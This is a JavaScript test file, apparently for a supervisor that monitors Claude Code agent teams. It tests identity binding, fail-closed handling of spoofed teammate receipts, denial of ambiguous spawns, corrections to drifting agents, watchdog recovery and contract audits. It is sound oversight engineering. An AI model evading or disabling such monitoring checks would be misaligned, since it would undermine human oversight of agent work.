  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "completion-2", tool_input: { taskId: "slice", status: "completed" },
    teammate_name: "alice" } });
  assert.equal(supervisorCalls, 0);
  assert.equal(h.store.events().some((event) =>
    event.type === "semantic_patrol_deferred_to_task_completion"
    && event.taskId === "slice"), true);
  assert.equal(h.store.events().some((event) => event.type === "semantic_patrol_due"), false);
});

test("TaskCompleted trusts an exact bound completion intent over shared Team lineage", () => {
  const h = harness();
  const bindingHash = "sha256:scheduler-binding";
  const intentHash = "sha256:scheduler-completion-intent";
  h.store.saveState({
    agents: {
      "teammate:store-owner": { id: "teammate:store-owner", agentId: "teammate:store-owner",
        agentKind: "teammate" },
      "teammate:scheduler-owner": { id: "teammate:scheduler-owner",
        agentId: "teammate:scheduler-owner", agentKind: "teammate",
        identitySource: "host-agent-spawn-binding" },
    },
    tasks: {
      scheduler: { id: "scheduler", kind: "team", owner: "scheduler-owner",
        assigneeAgentId: "teammate:scheduler-owner", status: "in_progress" },
    },
    teamIdentityBindings: {
      "sha256:raw-scheduler": { bindingHash,
        canonicalAgentId: "teammate:scheduler-owner", rawAgentIdHash: "sha256:raw-scheduler" },
    },
    /* This is the exact stale/shared-lineage shape from the live canary: a
       session/transcript hint had previously been associated with store. */
    agentIdentityLineages: {
      "sha256:shared-team-session": { agentId: "teammate:store-owner",
        agentKind: "teammate", identitySource: "lifecycle-teammate-name" },
    },
    pendingTaskCompletionIntents: {
      "sha256:scheduler-tool": {
        intentHash, toolUseId: "complete-scheduler", toolUseIdHash: "sha256:scheduler-tool",
        taskId: "scheduler", agentId: "teammate:scheduler-owner", identityBindingHash: bindingHash,
        preBoundarySeq: 10, preBoundaryEventHash: "sha256:pre-boundary",
        intentEventSeq: 11, intentEventHash: "sha256:intent-event",
      },
    },
    taskCompletionIntentOutcomes: {},
  });
  const resolved = h.controller.actorForTaskCompletion({
    hook_event_name: "TaskCompleted", task_id: "scheduler",
    teammate_name: "scheduler-owner", session_id: "shared-team-session",
    transcript_path: h.transcript,
  }, "scheduler");
  assert.equal(resolved.reason, null);
  assert.equal(resolved.actor.agentId, "teammate:scheduler-owner");
  assert.equal(resolved.intent.intentHash, intentHash);
  assert.equal(h.store.events().some((event) => event.type === "agent_identity_conflict"), false);
  assert.equal(h.store.readState().agentIdentityIntegrityCompromised, undefined);
});

test("contradictory teammate receipts never authorize a binding", () => {
  for (const [label, response] of [
    ["async-flag", { status: "teammate_spawned", isAsync: true,
      agentId: "bad-async", pin: { id: "bad-async", name: "alice" } }],
    ["pin-name", { status: "teammate_spawned", agentId: "bad-name",
      pin: { id: "bad-name", name: "mallory" } }],
  ]) {
    const h = harness();
    h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: `bad-${label}`,
      tool_input: { name: "alice", prompt: "owned work" },
    } });
    h.controller.subagentStart({ input: {
      hook_event_name: "SubagentStart", agent_id: response.agentId,
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "Agent", tool_use_id: `bad-${label}`,
      tool_input: { name: "alice", prompt: "owned work" }, tool_response: response,
    } });
    assert.equal(h.store.events().some((event) => event.type === "team_identity_bound"), false);
    const conflict = h.store.events().find((event) =>
      event.type === "team_identity_binding_conflict");
    assert.ok(conflict);
    assert.equal(h.store.readState().agentIdentityIntegrityCompromised, true);
  }
});

test("Agent name with async_launched or missing status remains a non-teammate", () => {
  for (const [label, response] of [
    ["async", { status: "async_launched", agentId: "ordinary-async" }],
    ["missing", { agentId: "ordinary-missing" }],
  ]) {
    const h = harness();
    const rawAgentId = response.agentId;
    h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: `named-${label}`,
      tool_input: { name: `named-${label}`, prompt: `do ${label}` },
      session_id: "shared-main", transcript_path: h.transcript,
    } });
    h.controller.subagentStart({ input: {
      hook_event_name: "SubagentStart", agent_id: rawAgentId,
      session_id: "shared-main", transcript_path: h.transcript,
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "Agent", tool_use_id: `named-${label}`,
      tool_input: { name: `named-${label}`, prompt: `do ${label}` },
      tool_response: response,
      session_id: "shared-main", transcript_path: h.transcript,
    } });
    h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: `action-${label}`,
      tool_input: { file_path: "src/value.js" }, agent_id: rawAgentId,
      session_id: "shared-main", transcript_path: h.transcript,
    } });
    const state = h.store.readState();
    assert.notEqual(state.agents[rawAgentId].agentKind, "teammate");
    assert.equal(state.agentAliases?.[rawAgentId], undefined);
    assert.equal(h.store.events().some((event) => event.type === "team_identity_bound"), false);
    const capability = h.store.events().find((event) =>
      event.type === "team_spawn_capability_observed");
    assert.equal(capability.toolUseId, `named-${label}`);
    assert.equal(capability.status, label === "async" ? "async_launched" : "missing");
    assert.equal(capability.isAsync, label === "async");
    assert.equal(capability.bindable, false);
  }
});

test("explicit agent ids never inherit a teammate from shared session lineage", () => {
  const h = harness();
  const shared = { session_id: "shared-team-session", transcript_path: h.transcript };
  h.controller.teammateIdle({ input: {
    hook_event_name: "TeammateIdle", teammate_name: "alice", ...shared,
  } });
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "unrelated-explicit-agent", ...shared,
  } });
  const state = h.store.readState();
  assert.equal(state.agents["unrelated-explicit-agent"].agentKind, "subagent");
  assert.equal(state.agentAliases?.["unrelated-explicit-agent"], undefined);
  assert.equal(state.agents["teammate:alice"].id, "teammate:alice");
});

test("an active implicit Team treats shared session lineage as context, not actor identity", () => {
  const h = harness();
  const shared = { session_id: "one-team-session", transcript_path: h.transcript };
  const seeded = h.controller.registerActor({
    hook_event_name: "TeammateIdle", teammate_name: "store-owner", ...shared,
  });
  assert.equal(seeded.agentId, "teammate:store-owner");
  const lineageState = h.store.readState();
  h.store.saveState({
    agents: {
      ...(lineageState.agents ?? {}),
      "teammate:scheduler-owner": { id: "teammate:scheduler-owner",
        agentId: "teammate:scheduler-owner", agentKind: "teammate",
        identitySource: "host-agent-spawn-binding" },
    },
    teamIdentityBindings: {
      "sha256:store-binding-key": { bindingHash: "sha256:store-binding",
        canonicalAgentId: "teammate:store-owner" },
      "sha256:scheduler-binding-key": { bindingHash: "sha256:scheduler-binding",
        canonicalAgentId: "teammate:scheduler-owner" },
    },
  });

  const lead = h.controller.registerActor({ hook_event_name: "PreToolUse",
    tool_name: "Bash", tool_use_id: "lead-check", ...shared });
  assert.equal(lead.agentId, "main",
    "an unnamed lead hook must not inherit a teammate from the shared transcript");
  const schedulerLifecycle = h.controller.registerActor({
    hook_event_name: "TeammateIdle", teammate_name: "scheduler-owner", ...shared,
  });
  assert.equal(schedulerLifecycle.agentId, "teammate:scheduler-owner");
  assert.equal(schedulerLifecycle.identityConflict, false);
  assert.equal(h.store.events().some((event) => event.type === "agent_identity_conflict"), false);
  assert.equal(h.store.readState().agentIdentityIntegrityCompromised, undefined);
});

test("concurrent teammate receipts bind by tool id and conflicting receipt ids fail closed", () => {
  const h = harness();
  const shared = { session_id: "concurrent-team", transcript_path: h.transcript };
  for (const name of ["alice", "bob", "mallory"]) {
    h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: `spawn-${name}`,
      tool_input: { name, prompt: `work owned by ${name}` }, ...shared,
    } });
  }
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "agent-alice", ...shared,
  } });
  /* Reverse completion order to prove no FIFO/lineage guess is involved.
     Bob also proves Post-before-SubagentStart is durably joined later. */
  for (const name of ["bob", "alice"]) {
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "Agent", tool_use_id: `spawn-${name}`,
      tool_input: { name, prompt: `work owned by ${name}` },
      tool_response: { toolUseResult: { status: "teammate_spawned",
        agentId: `agent-${name}`, pin: { id: `agent-${name}` } } },
      ...shared,
    } });
    if (name === "bob") h.controller.subagentStart({ input: {
      hook_event_name: "SubagentStart", agent_id: "agent-bob", ...shared,
    } });
  }
  let state = h.store.readState();
  assert.equal(state.agentAliases["agent-alice"], "teammate:alice");
  assert.equal(state.agentAliases["agent-bob"], "teammate:bob");

  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "Agent", tool_use_id: "spawn-mallory",
    tool_input: { name: "mallory", prompt: "work owned by mallory" },
    tool_response: { status: "teammate_spawned", agentId: "agent-one", pin: { id: "agent-two" } },
    ...shared,
  } });
  state = h.store.readState();
  assert.equal(state.agentAliases?.["agent-one"], undefined);
  assert.equal(state.agentAliases?.["agent-two"], undefined);
  assert.equal(state.agentIdentityIntegrityCompromised, true);
  assert.ok(h.store.events().some((event) => event.type === "team_identity_binding_conflict"
    && event.resolution === "fail-visible-no-overwrite"));
  assert.ok(h.store.events().some((event) => event.type === "team_spawn_task_link_unresolved"
    && event.taskLinkStatus === "missing-owned-team-task"
    && event.resolution === "fail-visible-no-guess"));
});

test("multiple team tasks with the same owner are not guessed during spawn binding", () => {
  const h = harness();
  for (const id of ["owned-a", "owned-b"]) {
    h.controller.taskCreated({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: id,
      task_description: id, teammate_name: "lead",
    } });
    h.controller.postTool({ input: {
      hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
      tool_input: { taskId: id, owner: "duplicate-owner", status: "in_progress" },
    } });
  }
  const blocked = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-duplicate",
    tool_input: { name: "duplicate-owner", prompt: "do one of the owned tasks" },
  } });
  assert.equal(blocked.output.hookSpecificOutput.permissionDecision, "deny");
  const state = h.store.readState();
  assert.equal(state.agents?.["teammate:duplicate-owner"], undefined);
  assert.equal(state.tasks["owned-a"].assigneeAgentId, undefined);
  assert.equal(state.tasks["owned-b"].assigneeAgentId, undefined);
  assert.equal(state.tasks["spawn-duplicate"], undefined,
    "a denied launch cannot create a generic delegated task");
  const unresolved = h.store.events().find((event) =>
    event.type === "team_delegation_binding_required");
  assert.equal(unresolved.resolution, "deny-before-agent-spawn");
  assert.equal(unresolved.candidateTeamTaskIdHashes.length, 2);
  assert.equal(h.store.events().some((event) => event.type === "team_spawn_requested"), false);
});

test("conflicting teammate lineage is fail-visible and never overwrites the first binding", () => {
  const h = harness();
  const identity = { session_id: "shared-host-session",
    transcript_path: path.join(h.cwd, "team", "actor.jsonl") };
  h.controller.teammateIdle({ input: {
    hook_event_name: "TeammateIdle", teammate_name: "alice", ...identity,
  } });
  const conflict = h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "wrong-owner", task_subject: "must not exist",
    teammate_name: "bob", ...identity,
  } });
  assert.equal(conflict.output._outsiderExitCode, 2);
  assert.equal(h.store.readState().tasks?.["wrong-owner"], undefined);
  assert.ok(h.store.events().some((event) => event.type === "agent_identity_conflict"
    && event.resolution === "fail-visible-no-overwrite"));
  assert.deepEqual([...new Set(Object.values(h.store.readState().agentIdentityLineages)
    .map((entry) => entry.agentId))], ["teammate:alice"]);

  const continued = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: "src/value.js" },
    tool_use_id: "same-lineage-after-conflict", ...identity,
  } });
  assert.equal(continued.output.hookSpecificOutput.permissionDecision, "allow");
  const stop = h.controller.stop({ input: { hook_event_name: "Stop" } });
  assert.equal(stop.output.decision, "block");
  assert.match(stop.output.reason, /身份连续性曾发生冲突/);
});

test("TeammateIdle corrections declare the host exit-2 delivery channel", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: false,
    drift: "alice is idling before her owned slice is verified",
    plan: ["finish src/value.js and submit the owned task through TaskCompleted"],
    expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "owned task is incomplete",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "idle-correction", task_subject: "finish slice",
    task_description: "finish src/value.js", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "idle-correction", owner: "alice", status: "in_progress" },
    teammate_name: "lead",
  } });
  const result = h.controller.teammateIdle({ input: {
    hook_event_name: "TeammateIdle", teammate_name: "alice",
  } });
  assert.equal(result.output._outsiderExitCode, 2);
  const correction = h.store.events().find((event) => event.type === "correction_emitted"
    && event.channel === "TeammateIdle.exit2");
  assert.equal(correction.channel, "TeammateIdle.exit2");
});

test("the shipped hook uses Claude's exit-2 lifecycle protocol for team redirection", async () => {
  const socketPath = controllerSocketPath("lifecycle-exit-two");
  const token = createControllerToken();
  const rpc = await startControllerRpc({
    socketPath,
    token,
    controller: { handleHook: () => ({
      decision: { verdict: "deny", corrective: "return to the task" },
      output: { _outsiderExitCode: 2, _outsiderStderr: "finish task t1 before idling" },
    }) },
  });
  try {
    const child = spawn(process.execPath, [path.resolve("bin/outsider-hook.mjs"), "claude-code"], {
      cwd: process.cwd(),
      env: { ...process.env, OUTSIDER_CONTROLLER_SOCKET: socketPath,
        OUTSIDER_CONTROLLER_TOKEN: token, OUTSIDER_BUDGET_MS: "5000" },
      stdio: ["pipe", "pipe", "pipe"],
    });
    let stdout = "", stderr = "";
    child.stdout.on("data", (chunk) => { stdout += chunk; });
    child.stderr.on("data", (chunk) => { stderr += chunk; });
    child.stdin.end(JSON.stringify({ hook_event_name: "TeammateIdle", teammate_name: "alice" }));
    const code = await new Promise((resolve) => child.once("close", resolve));
    assert.equal(code, 2);
    assert.equal(stdout, "");
    assert.match(stderr, /finish task t1 before idling/);
  } finally {
    await rpc.close();
  }
});

test("RunStore recovery rejects a different supervisor and resumes one monotonic event chain", () => {
  const h = harness();
  h.store.append("before_crash", { evidence: true });
  assert.throws(() => RunStore.open({
    directory: h.store.directory,
    supervisorCommand: "different-supervisor",
  }), /SUPERVISOR_IDENTITY_MISMATCH/);
  const recovered = RunStore.open({
    directory: h.store.directory,
    supervisorCommand: "fake-supervisor",
  });
  recovered.append("after_recovery", { evidence: true });
  const events = recovered.events();
  assert.equal(events.every((event, index) => event.seq === index + 1), true);
  assert.equal(new Set(events.map((event) => event.contractSeal)).size, 1);
  h.store.writeJson("baseline.json", { fingerprint: "sha256:replaced" });
  assert.throws(() => RunStore.open({
    directory: h.store.directory,
    supervisorCommand: "fake-supervisor",
  }), /BASELINE_EVIDENCE_MISMATCH/);
});

test("watchdog replaces a SIGKILLed controller and preserves the live team graph", async () => {
  const h = harness();
  const socketPath = controllerSocketPath("watchdog-recovery");
  const token = createControllerToken();
  const configPath = path.join(h.store.directory, "controller-config.test.json");
  writeFileSync(configPath, JSON.stringify({
    schema: "outsider/controller-config/v1",
    runDirectory: h.store.directory,
    supervisorCommand: "fake-supervisor",
    controllerOptions: { semanticPatrolEvery: 50, maxSupervisorCalls: 24 },
    leaseMs: 10_000,
    heartbeatMs: 250,
  }));
  const watchdog = await startControllerWatchdog({
    hostEntry: path.resolve("bin/outsider-controller-host.mjs"),
    configPath,
    socketPath,
    token,
    readyTimeoutMs: 5_000,
  });
  try {
    await requestController({ socketPath, token, payload: { agent: "claude-code", input: {
      hook_event_name: "TaskCreated", task_id: "survives", task_subject: "survive crash",
      task_description: "keep the graph", teammate_name: "lead",
    } }, timeoutMs: 2_000 });
    assert.equal(RunStore.open({ directory: h.store.directory,
      supervisorCommand: "fake-supervisor" }).readState().tasks.survives.subject, "survive crash");

    const firstGeneration = watchdog.generation;
    const crash = await watchdog.recordAndCrashForTest({
      eventType: "endurance_crash_injection_due",
      payload: { reason: "deterministic-test" },
      timeoutMs: 5_000,
    });
    assert.equal(watchdog.generation, firstGeneration + 1);
    assert.equal(crash.priorGeneration, firstGeneration);
    assert.equal(crash.generation, firstGeneration + 1);
    assert.equal(watchdog.restarts, 1);

    const after = await requestController({ socketPath, token, payload: { agent: "claude-code", input: {
      hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
      tool_input: { taskId: "survives", owner: "alice", status: "in_progress" },
      teammate_name: "lead",
    } }, timeoutMs: 2_000 });
    assert.equal(after.output && typeof after.output, "object");
    const recovered = RunStore.open({ directory: h.store.directory,
      supervisorCommand: "fake-supervisor" });
    assert.equal(recovered.readState().tasks.survives.owner, "alice");
    assert.equal(recovered.readState().tasks.survives.status, "in_progress");
    assert.ok(recovered.events().some((event) => event.type === "controller_recovered"
      && event.generation === 2));
    const due = recovered.events().find((event) => event.type === "endurance_crash_injection_due");
    const recoveredEvent = recovered.events().find((event) => event.type === "controller_recovered");
    assert.ok(due.seq < recoveredEvent.seq);
    assert.equal(recovered.events().every((event, index) => event.seq === index + 1), true);
    assert.equal(recovered.readJson("controller-lease.json").generation, 2);
  } finally {
    await watchdog.close();
  }
});

test("startKernelRun uses the recoverable controller process for a complete Stop proof", async () => {
  const { cwd, transcript } = workspace();
  let workerEnv = null;
  const supervisorCommand = `${JSON.stringify(process.execPath)} -e '
    process.stdout.write(JSON.stringify({passed:true,gaps:[],evidence:["semantic contract satisfied"]}))
  '`;
  const run = await startKernelRun({
    cwd,
    ask: "make value remain semantically correct",
    acceptance: `${JSON.stringify(process.execPath)} -e "process.exit(0)"`,
    supervisorCommand,
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    stateRoot: mkdtempSync(path.join(tmpdir(), "outsider-runner-state-")),
    maxBudgetUsd: 1,
    workerPreflight: () => ({ ok: true }),
    acceptancePreflight: ({ command }) => ({ ran: true, passed: true, exit: 0,
      command, output: "baseline green" }),
    contractCompiler: () => ({ ok: true, packetBytes: 10, semantic: {
      objective: "keep the public behavior correct",
      successCriteria: ["value export remains usable"],
      architecturalConstraints: ["preserve API"],
      forbiddenShortcuts: ["do not edit tests"],
      scope: { in: ["src"], out: [] }, uncertainties: [],
    } }),
    contractAuditor: ({ semantic }) => ({ ok: true,
      packet: { proposedSemanticContract: semantic }, verdict: {
        passed: true, errors: [], verifiedFacts: ["operator meaning preserved"],
      } }),
    baselineOutcomeAuditor: () => ({ ok: true, packet: { baseline: true }, verdict: {
      passed: true, errors: [], verifiedFacts: ["baseline PASS independently checked"],
    } }),
    spawnWorker: (_executable, _args, options) => {
      workerEnv = options.env;
      return { pid: 4242, stdout: null, stderr: null, kill: () => true };
    },
    budgetMs: 60_000,
  });
  try {
    assert.equal(run.controller, null, "the runner must not keep a second in-process controller");
    assert.equal(workerEnv.CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS, "1");
    const stopped = await requestController({
      socketPath: workerEnv.OUTSIDER_CONTROLLER_SOCKET,
      token: workerEnv.OUTSIDER_CONTROLLER_TOKEN,
      payload: { agent: "claude-code", input: {
        hook_event_name: "Stop", transcript_path: transcript,
      } },
      timeoutMs: 10_000,
    });
    assert.equal(stopped.output.decision, "approve");
    await run.record("worker_exit", { code: 0, signal: null });
    const finished = await run.finish();
    assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
    assert.equal(finished.evidence?.ok, true, finished.evidence?.error);
    assert.equal(finished.evidence.manifest.eventChain.cryptographic, true);
    assert.match(finished.evidence.manifest.workspaceIdentityHash, /^sha256:[a-f0-9]{64}$/);
    assert.equal(finished.evidence.manifest.rawLocalRoot.entries.some((entry) =>
      entry.logicalRole === "CONTROLLER_WORKSPACE_IDENTITY"), true);
    assert.equal(finished.evidence.projection.outcome.terminalClass, "SAFE_DELIVERY");
    const events = run.store.events();
    assert.ok(events.some((event) => event.type === "controller_started" && event.generation === 1));
    assert.ok(events.some((event) => event.type === "worker_launch"));
    const contractAudit = events.find((event) => event.type === "contract_audited");
    const workerLaunch = events.find((event) => event.type === "worker_launch");
    assert.equal(contractAudit.passed, true);
    assert.ok(contractAudit.seq < workerLaunch.seq,
      "the compiler's paraphrase must be independently authorized before the worker exists");
    assert.ok(events.some((event) => event.type === "baseline_outcome_verdict"
      && event.checked === true && event.passed === true));
    assert.ok(events.some((event) => event.type === "outcome_verdict"
      && event.source === "baseline-outcome-attestation"));
    assert.ok(events.some((event) => event.type === "run_finalized"
      && event.proofComplete === true && event.acceptancePassed === true));
    assert.equal(events.some((event) => event.type === "outcome_verifier_requested"), false,
      "an unchanged, independently attested baseline must not enter a Stop livelock");
  } finally {
    await run.watchdog.close().catch(() => undefined);
  }
});
